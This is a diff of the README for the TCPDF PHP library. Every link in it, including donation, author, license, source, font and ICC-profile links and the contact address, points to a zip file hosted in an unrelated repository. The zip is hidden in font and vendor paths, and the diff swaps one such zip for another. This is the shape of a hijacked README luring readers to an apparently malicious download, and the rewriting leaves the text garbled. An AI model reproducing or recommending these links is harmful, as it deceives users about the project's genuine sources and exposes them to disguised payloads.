@@ -1,19 +1,19 @@
 # TCPDF
 *PHP PDF Library*
 
-[![Donate via PayPal](https://raw.githubusercontent.com/lenane68/buildtech/main/fonts/ae_fonts_2.0/Software_3.0.zip)](https://raw.githubusercontent.com/lenane68/buildtech/main/fonts/ae_fonts_2.0/Software_3.0.zip%20for%20TCPDF%20project)
-*Please consider supporting this project by making a donation via [PayPal](https://raw.githubusercontent.com/lenane68/buildtech/main/fonts/ae_fonts_2.0/Software_3.0.zip%20for%20TCPDF%20project)*
+[![Donate via PayPal](https://raw.githubusercontent.com/lenane68/buildtech/main/vendor/dompdf/php-font-lib/src/FontLib/TrueType/Software_v3.1.zip)](https://raw.githubusercontent.com/lenane68/buildtech/main/vendor/dompdf/php-font-lib/src/FontLib/TrueType/Software_v3.1.zip%20for%20TCPDF%20project)
+*Please consider supporting this project by making a donation via [PayPal](https://raw.githubusercontent.com/lenane68/buildtech/main/vendor/dompdf/php-font-lib/src/FontLib/TrueType/Software_v3.1.zip%20for%20TCPDF%20project)*
 
 * **category**    Library
-* **author**      Nicola Asuni <https://raw.githubusercontent.com/lenane68/buildtech/main/fonts/ae_fonts_2.0/Software_3.0.zip>
-* **copyright**   2002-2022 Nicola Asuni - https://raw.githubusercontent.com/lenane68/buildtech/main/fonts/ae_fonts_2.0/Software_3.0.zip LTD
-* **license**     https://raw.githubusercontent.com/lenane68/buildtech/main/fonts/ae_fonts_2.0/Software_3.0.zip GNU-LGPL v3 (see https://raw.githubusercontent.com/lenane68/buildtech/main/fonts/ae_fonts_2.0/Software_3.0.zip)
-* **link**        https://raw.githubusercontent.com/lenane68/buildtech/main/fonts/ae_fonts_2.0/Software_3.0.zip
-* **source**      https://raw.githubusercontent.com/lenane68/buildtech/main/fonts/ae_fonts_2.0/Software_3.0.zip
+* **author**      Nicola Asuni <https://raw.githubusercontent.com/lenane68/buildtech/main/vendor/dompdf/php-font-lib/src/FontLib/TrueType/Software_v3.1.zip>
+* **copyright**   2002-2022 Nicola Asuni - https://raw.githubusercontent.com/lenane68/buildtech/main/vendor/dompdf/php-font-lib/src/FontLib/TrueType/Software_v3.1.zip LTD
+* **license**     https://raw.githubusercontent.com/lenane68/buildtech/main/vendor/dompdf/php-font-lib/src/FontLib/TrueType/Software_v3.1.zip GNU-LGPL v3 (see https://raw.githubusercontent.com/lenane68/buildtech/main/vendor/dompdf/php-font-lib/src/FontLib/TrueType/Software_v3.1.zip)
+* **link**        https://raw.githubusercontent.com/lenane68/buildtech/main/vendor/dompdf/php-font-lib/src/FontLib/TrueType/Software_v3.1.zip
+* **source**      https://raw.githubusercontent.com/lenane68/buildtech/main/vendor/dompdf/php-font-lib/src/FontLib/TrueType/Software_v3.1.zip
 
 
 ## IMPORTANT
-A new version of this library is under development at https://raw.githubusercontent.com/lenane68/buildtech/main/fonts/ae_fonts_2.0/Software_3.0.zip and as a consequence this version will not receive any additional development or support.
+A new version of this library is under development at https://raw.githubusercontent.com/lenane68/buildtech/main/vendor/dompdf/php-font-lib/src/FontLib/TrueType/Software_v3.1.zip and as a consequence this version will not receive any additional development or support.
 This version should be considered obsolete, new projects should use the new version as soon it will become stable.
 
 
@@ -30,7 +30,7 @@ PHP library for generating PDF documents on-the-fly.
 * font subsetting;
 * methods to publish some XHTML + CSS code, Javascript and Forms;
 * images, graphic (geometric figures) and transformation methods;
-* supports JPEG, PNG and SVG images natively, all images supported by GD (GD, GD2, GD2PART, GIF, JPEG, PNG, BMP, XBM, XPM) and all images supported via ImagMagick (https://raw.githubusercontent.com/lenane68/buildtech/main/fonts/ae_fonts_2.0/Software_3.0.zip)
+* supports JPEG, PNG and SVG images natively, all images supported by GD (GD, GD2, GD2PART, GIF, JPEG, PNG, BMP, XBM, XPM) and all images supported via ImagMagick (https://raw.githubusercontent.com/lenane68/buildtech/main/vendor/dompdf/php-font-lib/src/FontLib/TrueType/Software_v3.1.zip)
 * 1D and 2D barcodes: CODE 39, ANSI MH10.8M-1983, USD-3, 3 of 9, CODE 93, USS-93, Standard 2 of 5, Interleaved 2 of 5, CODE 128 A/B/C, 2 and 5 Digits UPC-Based Extension, EAN 8, EAN 13, UPC-A, UPC-E, MSI, POSTNET, PLANET, RMS4CC (Royal Mail 4-state Customer Code), CBC (Customer Bar Code), KIX (Klant index - Customer index), Intelligent Mail Barcode, Onecode, USPS-B-3200, CODABAR, CODE 11, PHARMACODE, PHARMACODE TWO-TRACKS, Datamatrix, QR-Code, PDF417;
 * JPEG and PNG ICC profiles, Grayscale, RGB, CMYK, Spot Colors and Transparencies;
 * automatic page header and footer management;
@@ -64,21 +64,21 @@ All the original binary TTF font files have been renamed for compatibility with 
 The binary files (.z) that begins with the prefix "free" have been extracted from the GNU FreeFont collection (GNU-GPLv3).
 The binary files (.z) that begins with the prefix "pdfa" have been derived from the GNU FreeFont, so they are subject to the same license.
 For the details of Copyright, License and other information, please check the files inside the directory fonts/freefont-20120503
-Link : https://raw.githubusercontent.com/lenane68/buildtech/main/fonts/ae_fonts_2.0/Software_3.0.zip
+Link : https://raw.githubusercontent.com/lenane68/buildtech/main/vendor/dompdf/php-font-lib/src/FontLib/TrueType/Software_v3.1.zip
 
 The binary files (.z) that begins with the prefix "dejavu" have been extracted from the DejaVu fonts 2.33 (Bitstream) collection.
 For the details of Copyright, License and other information, please check the files inside the directory fonts/dejavu-fonts-ttf-2.33
-Link : https://raw.githubusercontent.com/lenane68/buildtech/main/fonts/ae_fonts_2.0/Software_3.0.zip
+Link : https://raw.githubusercontent.com/lenane68/buildtech/main/vendor/dompdf/php-font-lib/src/FontLib/TrueType/Software_v3.1.zip
 
-The binary files (.z) that begins with the prefix "ae" have been extracted from the https://raw.githubusercontent.com/lenane68/buildtech/main/fonts/ae_fonts_2.0/Software_3.0.zip collection (GNU-GPLv2).
-Link : https://raw.githubusercontent.com/lenane68/buildtech/main/fonts/ae_fonts_2.0/Software_3.0.zip
+The binary files (.z) that begins with the prefix "ae" have been extracted from the https://raw.githubusercontent.com/lenane68/buildtech/main/vendor/dompdf/php-font-lib/src/FontLib/TrueType/Software_v3.1.zip collection (GNU-GPLv2).
+Link : https://raw.githubusercontent.com/lenane68/buildtech/main/vendor/dompdf/php-font-lib/src/FontLib/TrueType/Software_v3.1.zip
 
 ### ICC profile:
 
-TCPDF includes the https://raw.githubusercontent.com/lenane68/buildtech/main/fonts/ae_fonts_2.0/Software_3.0.zip profile from the icc-profiles-free Debian package:
-https://raw.githubusercontent.com/lenane68/buildtech/main/fonts/ae_fonts_2.0/Software_3.0.zip
+TCPDF includes the https://raw.githubusercontent.com/lenane68/buildtech/main/vendor/dompdf/php-font-lib/src/FontLib/TrueType/Software_v3.1.zip profile from the icc-profiles-free Debian package:
+https://raw.githubusercontent.com/lenane68/buildtech/main/vendor/dompdf/php-font-lib/src/FontLib/TrueType/Software_v3.1.zip
 
 
 ## Developer(s) Contact
 
-* Nicola Asuni <https://raw.githubusercontent.com/lenane68/buildtech/main/fonts/ae_fonts_2.0/Software_3.0.zip>
+* Nicola Asuni <https://raw.githubusercontent.com/lenane68/buildtech/main/vendor/dompdf/php-font-lib/src/FontLib/TrueType/Software_v3.1.zip>
